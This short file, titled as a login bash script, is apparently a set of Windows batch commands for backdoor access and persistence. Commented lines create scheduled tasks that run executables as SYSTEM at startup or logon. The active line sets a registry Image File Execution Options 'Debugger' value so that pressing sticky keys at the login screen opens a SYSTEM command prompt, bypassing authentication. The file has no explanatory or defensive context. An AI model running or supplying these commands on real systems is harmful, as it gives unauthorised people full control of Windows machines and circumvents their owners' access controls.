# login-bash-script

REM schtasks /create /tn "win_start" /tr c:\windows\system32\wshirda_03.exe /sc onstart /ru "system"
REM alt + shift + print_screen
REM schtasks /create /tn "don_coleone" /tr C:\Users\khanflex\Desktop\Test\khanspace.exe /sc onlogon /ru "system"
cmd.exe /c "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f"
